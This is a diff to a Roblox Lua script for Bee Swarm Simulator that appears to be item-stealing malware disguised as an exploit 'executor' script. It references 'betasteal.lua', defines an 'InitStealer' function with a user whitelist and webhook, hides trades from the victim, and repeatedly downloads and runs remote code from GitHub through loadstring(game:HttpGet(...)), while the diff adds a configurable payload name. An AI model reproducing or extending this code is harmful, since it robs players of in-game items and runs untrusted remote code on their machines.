@@ -1,11 +1,16 @@
 _G.LINK = "https://raw.githubusercontent.com/K-0N/mytest2/refs/heads/main/betasteal.lua"
+_G.META = "rewrite"
 if(getgenv()['0xAtlas__executed'])then return;end;
 getgenv()['0xAtlas__executed']=(1);
 local function atlasInitVars()(function()
-      if _G.IsTeleportFromPriv then
-          repeat task.wait() until _G.IAMABSOLUTELYDONE
-      end
-      loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/refs/heads/main/script.lua"))()
+    if _G.IsTeleportFromPriv then
+        task.spawn(function()
+            repeat task.wait() until _G.IAMABSOLUTELYDONE
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/refs/heads/main/" .. _G.META .. ".lua"))()
+        end)
+    else
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/refs/heads/main/" .. _G.META .. ".lua"))()
+    end
 end)()end
 task.delay(2,atlasInitVars);
 
@@ -43,29 +48,6 @@ local GameData = {
     IsBSS = await(ReplicatedFirst, "PlaceType").Value == "Main" or await(ReplicatedFirst, "PlaceType").Value == "Hive Hub",
     CanTrade = await(LocalPlayer, "TradeConfig", "CanTrade").Value
 }
-
-local function serverhop()
-    local function serverhop()
-        local servers = {}
-        local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true")
-        local body = game:GetService("HttpService"):JSONDecode(req)
-
-        if body and body.data then
-            for i, v in next, body.data do
-                if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
-                    table.insert(servers, 1, v.id)
-                end
-            end
-        end
-
-        if #servers > 0 then
-            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game:GetService("Players").LocalPlayer)
-        else
-            return warn("Couldn't find a server.")
-        end
-    end
-    pcall(serverhop)
-end
 
 local function HttpRequest(Url, Method, StatusCodes, Body, __Fails)
     local RequestFunction = (http and http.request) or (syn and syn.request) or http_request or request
@@ -755,10 +737,6 @@ local function InitStealer(UserWhitelist, Webhook, WhitelistedStickers, AtlasLoa
         end
     end
 
-    do
-        HideTrades()
-    end;
-
     task.spawn(function()
         local LastTrade = 0
         while task.wait() do
@@ -877,6 +855,8 @@ local function InitStealer(UserWhitelist, Webhook, WhitelistedStickers, AtlasLoa
     if GameData.IsPrivateServer then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/K-0N/mytest2/refs/heads/main/install.lua"))()
         return
+    else
+        HideTrades()
     end
 
     return nil
@@ -884,6 +864,9 @@ end
 
 if #Players:GetPlayers() == Players.MaxPlayers then
     while #Players:GetPlayers() == Players.MaxPlayers do
+        if GameData.IsPrivateServer then
+            break
+        end
         task.wait()
     end
 end
